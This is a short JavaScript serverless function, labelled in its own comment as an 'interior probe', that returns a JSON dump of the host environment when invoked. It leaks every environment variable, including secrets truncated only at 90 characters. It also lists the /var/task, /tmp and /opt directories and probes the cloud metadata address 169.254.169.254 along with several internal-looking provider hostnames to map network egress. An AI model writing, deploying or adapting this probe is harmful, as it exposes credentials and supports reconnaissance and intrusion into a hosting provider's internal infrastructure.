// v2-shape (ESM export default, Web Request/Response) functions interior probe — production invoke returns JSON.
import https from 'https';
import http from 'http';
import fs from 'fs';

function get(url, extra) {
  return new Promise((resolve) => {
    let done = false;
    const fin = (v) => { if (!done) { done = true; resolve(v); } };
    try {
      const mod = url.startsWith('https') ? https : http;
      const req = mod.get(url, { timeout: 3500, headers: Object.assign({ accept: '*/*' }, extra || {}) }, (res) => {
        let n = 0; const ch = [];
        res.on('data', (c) => { n += c.length; if (n <= 300) ch.push(c); if (n > 65536) req.destroy(); });
        res.on('end', () => fin({ s: res.statusCode, loc: res.headers.location, len: n }));
        res.on('error', () => fin({ s: res.statusCode, len: n }));
      });
      req.on('timeout', () => { req.destroy(); fin({ err: 'timeout' }); });
      req.on('error', (e) => fin({ err: String(e.message || e).slice(0, 60) }));
    } catch (e) { fin({ err: String(e.message || e).slice(0, 60) }); }
    setTimeout(() => fin({ err: 'hard-timeout' }), 4100);
  });
}

async function collect() {
  const out = { probe: 'v2prod', t: new Date().toISOString() };
  out.env = {};
  for (const [k, v] of Object.entries(process.env)) {
    const s = String(v);
    out.env[k] = s.length > 90 ? s.slice(0, 90) + `..(len${s.length})` : s;
  }
  out.versions = { node: process.version, platform: process.platform, cwd: process.cwd(), uid: (process.getuid && process.getuid()) };
  out.fs = {};
  for (const p of ['/var/task', '/tmp', '/opt']) {
    try { out.fs[p] = fs.readdirSync(p).slice(0, 30); } catch (e) { out.fs[p] = 'ERR:' + String(e.code || e.message).slice(0, 30); }
  }
  try { out.fs.proc_count = fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x)).length; } catch (e) { out.fs.proc_count = 'ERR'; }
  const HOSTS = ['vault-releng.infra-prod.nsvcs.net', 'nimble-control-plane.services-prod.nsvcs.net', 'netlify-compute-proxy.services-prod.nsvcs.net', 'internal.netlify.com'];
  out.egress = {};
  out.egress.imds = await get('http://169.254.169.254/latest/meta-data/');
  for (const h of HOSTS) out.egress[h] = await get('https://' + h + '/');
  return out;
}

export default async function handler() {
  const out = await collect().catch((e) => ({ fatal: String(e && e.message || e) }));
  return new Response(JSON.stringify(out), { status: 200, headers: { 'content-type': 'application/json' } });
}
